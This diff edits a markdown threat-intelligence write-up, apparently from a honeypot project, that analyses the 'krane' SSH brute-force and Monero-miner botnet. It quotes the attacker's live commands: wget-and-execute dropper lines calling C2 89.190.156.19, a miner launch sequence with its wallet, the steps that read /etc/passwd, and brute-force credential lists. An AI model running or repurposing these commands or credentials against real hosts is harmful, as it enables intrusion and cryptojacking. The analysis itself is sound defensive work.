@@ -22,13 +22,13 @@ tags:
   - origin/romanian
 ---
 
-# Krane Botnet Campaign — 2026-04-20
+# Krane Botnet Campaign: 2026-04-20
 
 ## Executive Summary
 
 On 2026-04-20 at 07:24 UTC, a honeypot session captured a fully automated compromise-and-deploy sequence. The attacker logged in with password `050602`, ran a dropper script (`bins.sh`), and downloaded five binaries from C2 `89.190.156.19`. Deep static analysis of the captured binaries reveals a **custom Go-compiled SSH brute-force scanner and Monero cryptominer dropper** authored by a **Romanian-speaking developer** whose Linux username is **`krane`**. A companion DDoS tool ("hoho", not captured) was also referenced.
 
-This is **not a Mirai variant** — the krane binaries are statically-compiled Go binaries (~6MB) that scan the internet for SSH on port 22, brute-force credentials, then drop an XMRig-family Monero miner (`vltrig`) on each compromised host. The binary also embeds a **Romanian anti-theft rant** directed at anyone who copies the source code, confirming active development and author ego-investment in the project.
+This is **not a Mirai variant**: the krane binaries are statically-compiled Go binaries (~6MB) that scan the internet for SSH on port 22, brute-force credentials, then drop an XMRig-family Monero miner (`vltrig`) on each compromised host. The binary also embeds a **Romanian anti-theft rant** directed at anyone who copies the source code, confirming active development and author ego-investment in the project.
 
 ---
 
@@ -62,9 +62,9 @@ sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
 
 ---
 
-## bins.sh Dropper — Full Content
+## bins.sh Dropper: Full Content
 
-SHA256: `c0d96546c15948ac504193f1d3bc9adbdacb129dca30e56b93936d88ef658f35`  
+SHA256: `c0d96546c15948ac504193f1d3bc9adbdacb129dca30e56b93936d88ef658f35`
 Size: 2,275 bytes
 
 ```sh
@@ -88,14 +88,14 @@ cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.x86; chmod +x hoho.x
 ```
 
 **Key observations:**
-- `ulimit -n 99999` — raises open file descriptor limit before execution, enabling high-concurrency port scanning
-- **Self-deletes** after launch (`rm -rf`) — leaves no artefact on disk
-- Tries every architecture sequentially — whichever binary successfully executes on the target architecture wins
+- `ulimit -n 99999`: raises open file descriptor limit before execution, enabling high-concurrency port scanning
+- **Self-deletes** after launch (`rm -rf`): leaves no artefact on disk
+- Tries every architecture sequentially: whichever binary successfully executes on the target architecture wins
 - **Two distinct tools:** `krane_*` (SSH spreader) and `hoho.*` (DDoS bot)
 
 ---
 
-## Krane Binaries — Static Analysis
+## Krane Binaries: Static Analysis
 
 ### File Inventory (captured by honeypot)
 
@@ -113,10 +113,10 @@ cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.x86; chmod +x hoho.x
 
 - **Language:** Go (confirmed via Go runtime symbols, module paths)
 - **Go version:** `go1.26.2` (embedded in binary)
-- **Build type:** Statically compiled (explains 6MB size — all dependencies bundled)
-- **All 4 ARM/MIPS variants are identical in function** — same source, cross-compiled
+- **Build type:** Statically compiled (explains 6MB size: all dependencies bundled)
+- **All 4 ARM/MIPS variants are identical in function**: same source, cross-compiled
 
-### Developer Attribution — Romanian Origin
+### Developer Attribution: Romanian Origin
 
 A developer home path was embedded in the binary's debug symbols:
 
@@ -137,12 +137,12 @@ The project name and directory structure describe the botnet's own architecture 
 ### Source Files (leaked via debug symbols)
 
 ```
-Passfile.go    — credential list management
-Resources.go   — CPU/memory resource monitoring
-SSH.go         — SSH brute force engine
-Syn.go         — SYN scanner / SYN flood
-TCP-Scan.go    — TCP port scanner
-main.go        — orchestration entry point
+Passfile.go   : credential list management
+Resources.go  : CPU/memory resource monitoring
+SSH.go        : SSH brute force engine
+Syn.go        : SYN scanner / SYN flood
+TCP-Scan.go   : TCP port scanner
+main.go       : orchestration entry point
 ```
 
 ### Key Functions (from binary symbols)
@@ -171,11 +171,11 @@ main.go        — orchestration entry point
 ### Network Behaviour
 
 - **Self-identification:** Calls `https://api.ipify.org?format=text` on startup to discover its own external IP (used for routing/reporting back to C2)
-- **Go module import path:** `minecraftpixelger39clone.dedyn.io/kranenr1` — a dynamic DNS domain (dedyn.io) disguised as a Minecraft community name, likely also serves as C2 endpoint
+- **Go module import path:** `minecraftpixelger39clone.dedyn.io/kranenr1`: a dynamic DNS domain (dedyn.io) disguised as a Minecraft community name, likely also serves as C2 endpoint
 - **Hardcoded DNS resolvers:** `8.8.8.8` (Google), `1.1.1.1` (Cloudflare)
 - **Skips private IPs** during scanning (`isPrivateIP` function)
 
-### Embedded Credentials (partial — found in binary strings)
+### Embedded Credentials (partial: found in binary strings)
 
 ```
 admin, root, user, pi, test, support, default, enable, system,
@@ -186,14 +186,14 @@ These are common defaults for routers, IoT devices, and Linux servers. The `pi` 
 
 ---
 
-## hoho Binaries — Assessment
+## hoho Binaries: Assessment
 
-The bins.sh dropper references a second toolset, `hoho.*`, served from `http://89.190.156.19/bins/`. These were **not captured** by the honeypot (Cowrie did not download them — only the krane binaries triggered full capture).
+The bins.sh dropper references a second toolset, `hoho.*`, served from `http://89.190.156.19/bins/`. These were **not captured** by the honeypot (Cowrie did not download them: only the krane binaries triggered full capture).
 
-**Architecture targets for hoho:** arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc (SPARC), x86  
-**11 architectures** vs krane's 6 — significantly broader IoT/embedded targeting.
+**Architecture targets for hoho:** arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc (SPARC), x86
+**11 architectures** vs krane's 6: significantly broader IoT/embedded targeting.
 
-The broader architecture list and separate `bins/` subdirectory path suggests `hoho` is a **separate codebase** — likely a C-compiled Mirai-variant DDoS bot. The two tools complement each other: krane spreads across SSH, hoho provides DDoS attack capability on the infected device.
+The broader architecture list and separate `bins/` subdirectory path suggests `hoho` is a **separate codebase**: likely a C-compiled Mirai-variant DDoS bot. The two tools complement each other: krane spreads across SSH, hoho provides DDoS attack capability on the infected device.
 
 ---
 
@@ -240,7 +240,7 @@ See companion file: [`NINGI-WRITEUP-009-krane-botnet-iocs.md`](NINGI-WRITEUP-009
 
 ---
 
-## Stage 3 — Cryptominer Deployment (NEW — from deep binary analysis)
+## Stage 3: Cryptominer Deployment (NEW: from deep binary analysis)
 
 The binary's third stage, revealed by full string extraction from `krane_mips`, deploys a **Monero (XMR) miner** on every successfully compromised host.
 
@@ -266,14 +266,14 @@ sleep 3;
 
 | Field | Value |
 |-------|-------|
-| Tool | `vltrig` — XMRig-family miner from HashVault |
+| Tool | `vltrig`: XMRig-family miner from HashVault |
 | Currency | **Monero (XMR)** |
 | Wallet | `46qJM6LUpYjVPVS6CYRx3x9HpXboYd3gK5HBd9UgWtCGcrNQJKgTxGJ1TcndT3SLDNFnJvjo8LzjpX2uZL7aEtZiFrsGTLa` |
-| Pool / password | `x` (default XMRig pool pass — likely a public pool via C2) |
-| CPU cap | 70% (`--cpu-max-threads-hint=70`) — deliberate stealth to avoid detection |
-| Donation | `--donate-level 0` — removes XMRig developer donation (evades known pool fingerprint) |
-| Persistence | `--background` — detaches from terminal |
-| Config wipe | `rm -rf config.json` — forces CLI args, prevents accidental config-file override |
+| Pool / password | `x` (default XMRig pool pass: likely a public pool via C2) |
+| CPU cap | 70% (`--cpu-max-threads-hint=70`): deliberate stealth to avoid detection |
+| Donation | `--donate-level 0`: removes XMRig developer donation (evades known pool fingerprint) |
+| Persistence | `--background`: detaches from terminal |
+| Config wipe | `rm -rf config.json`: forces CLI args, prevents accidental config-file override |
 
 **Staging via GitHub:** The miner is fetched from a GitHub releases page (`HashVault/vltrig`), not the C2 server. This abuses GitHub's CDN trust and bypasses IP-based blocklists on the C2.
 
@@ -281,7 +281,7 @@ sleep 3;
 
 ## Operator Live Dashboard (stats format string)
 
-The binary logs a real-time stats line during operation — this is what the operator sees in their terminal:
+The binary logs a real time stats line during operation: this is what the operator sees in their terminal:
 
 ```
 [stats] brute=%d/%d  scan=%d/%d  queued=%d  total=%d  passfile=%d
@@ -290,14 +290,14 @@ The binary logs a real-time stats line during operation — this is what the ope
 ```
 
 Fields decoded:
-- `brute` — successful / total brute force attempts
-- `scan` — SSH ports found open / total IPs scanned
-- `queued` — IPs queued for brute force
-- `scanned(+N/s)` — cumulative scan rate in IPs per second
-- `found` — total confirmed compromises (logGotcha events)
-- `range` — current /8 class-A block being swept (e.g. `45.*.*.*`)
-- `throttle` — current throttle state
-- `CPU/MEM` — live resource stats from `/proc/stat` and `/proc/meminfo`
+- `brute`: successful / total brute force attempts
+- `scan`: SSH ports found open / total IPs scanned
+- `queued`: IPs queued for brute force
+- `scanned(+N/s)`: cumulative scan rate in IPs per second
+- `found`: total confirmed compromises (logGotcha events)
+- `range`: current /8 class-A block being swept (e.g. `45.*.*.*`)
+- `throttle`: current throttle state
+- `CPU/MEM`: live resource stats from `/proc/stat` and `/proc/meminfo`
 
 ---
 
@@ -311,11 +311,11 @@ Build machine path confirms the developer's Linux username:
 /home/krane/Desktop/Seriozitate/Afacere-la-cheie/Client-Dropat-In-Servere-Prinse/src-copie-go/
 ```
 
-The project name **is** the author's handle — they named the binary after themselves.
+The project name **is** the author's handle: they named the binary after themselves.
 
 ### Anti-Theft Watermark (Romanian)
 
-Embedded verbatim in the binary — a rant directed at anyone who copies the source:
+Embedded verbatim in the binary: a rant directed at anyone who copies the source:
 
 ```
 [+] GESTUL TAU, FOARTE URAT, CA AI INDRAZNIT SA FURI DE LA MINE,
@@ -326,13 +326,13 @@ Embedded verbatim in the binary — a rant directed at anyone who copies the sou
 **English translation:**
 > *"YOUR GESTURE, VERY UGLY, THAT YOU DARED TO STEAL FROM ME, WHO I AM CLEVER FOR MANY PEOPLE NOT JUST FOR YOU, BUT IT IS UGLY TO SAY THIS, FINALLY"*
 
-This watermark serves two purposes: (1) it asserts ownership of the codebase, and (2) it confirms the binary is an **original custom tool** — not a leaked or forked project — with an author who is actively maintaining it and is aware of code theft in the underground. The `[+]` bracketing mirrors the log format used throughout the tool.
+This watermark serves two purposes: (1) it asserts ownership of the codebase, and (2) it confirms the binary is an **original custom tool**: not a leaked or forked project: with an author who is actively maintaining it and is aware of code theft in the underground. The `[+]` bracketing mirrors the log format used throughout the tool.
 
 ### Build Timeline
 
-- Go crypto module pinned to `golang.org/x/crypto@v0.0.0-20220112180741-5e0467b6c7ce` — January 12, 2022
+- Go crypto module pinned to `golang.org/x/crypto@v0.0.0-20220112180741-5e0467b6c7ce`: January 12, 2022
 - Binary built no earlier than **2022-01-12**
-- Go version `go1.26.2` embedded — recent toolchain
+- Go version `go1.26.2` embedded: recent toolchain
 
 ---
 
@@ -372,11 +372,11 @@ tlqtest1:tlqtest1123
 ```
 
 **Notable targeting:**
-- `chia:*` — Chia Network blockchain node operators (CPU/storage farming)
-- `azureuser:azureuser` — Azure VM default user
-- `minecraft:minecraft` — Minecraft server hosts (high-CPU, often poorly secured)
-- `ansible/vagrant/deployer` — DevOps infrastructure accounts
-- `smoothwall` — Smoothwall firewall appliance default
+- `chia:*`: Chia Network blockchain node operators (CPU/storage farming)
+- `azureuser:azureuser`: Azure VM default user
+- `minecraft:minecraft`: Minecraft server hosts (high-CPU, often poorly secured)
+- `ansible/vagrant/deployer`: DevOps infrastructure accounts
+- `smoothwall`: Smoothwall firewall appliance default
 
 ---
 
@@ -388,7 +388,7 @@ The binary contains a specific AWS execution path:
 [syn] raw socket OK (AWS mode), outbound IP: <ip>
 ```
 
-When running inside AWS EC2, raw socket behaviour is adjusted — likely because EC2 restricts raw packet injection and the binary detects this and falls back to TCP dial mode. This suggests the author has tested and operates from AWS instances.
+When running inside AWS EC2, raw socket behaviour is adjusted: likely because EC2 restricts raw packet injection and the binary detects this and falls back to TCP dial mode. This suggests the author has tested and operates from AWS instances.
 
 ---
 
@@ -396,10 +396,10 @@ When running inside AWS EC2, raw socket behaviour is adjusted — likely because
 
 ```
 1. SSH brute force succeeds
-2. logGotcha() — logs host:user:pass to operator's log file
-3. uname -a — fingerprints the host
-4. cat /etc/passwd — exfiltrates local user list
-5. HarvestAndMerge() — adds creds to the harvested pool
+2. logGotcha(): logs host:user:pass to operator's log file
+3. uname -a: fingerprints the host
+4. cat /etc/passwd: exfiltrates local user list
+5. HarvestAndMerge(): adds creds to the harvested pool
 6. Drop miner:
      cd /tmp
      curl || wget → vltrig.tar.gz (from GitHub CDN)
@@ -431,8 +431,8 @@ When running inside AWS EC2, raw socket behaviour is adjusted — likely because
 
 ## Notes
 
-- The Monero wallet `46qJM6...` is a permanent attribution anchor — any pool reporting against this wallet confirms krane infrastructure activity.
-- The Go module domain `minecraftpixelger39clone.dedyn.io` uses dedyn.io (desec.io dynamic DNS) — low-cost, privacy-preserving, easy to rotate. Consider blocking `*.dedyn.io` if not used legitimately.
-- The `ulimit -n 99999` trick is a strong behavioural signal — legitimate processes rarely need 100k file descriptors.
+- The Monero wallet `46qJM6...` is a permanent attribution anchor: any pool reporting against this wallet confirms krane infrastructure activity.
+- The Go module domain `minecraftpixelger39clone.dedyn.io` uses dedyn.io (desec.io dynamic DNS): low-cost, privacy-preserving, easy to rotate. Consider blocking `*.dedyn.io` if not used legitimately.
+- The `ulimit -n 99999` trick is a strong behavioural signal: legitimate processes rarely need 100k file descriptors.
 - All 4 captured krane binaries are functionally identical (same source, cross-compiled). SHA256 differences are architecture-specific, not different codebases.
 - The embedded anti-theft message confirms this is **original code** under active development by a single Romanian-speaking author who goes by the handle `krane`.
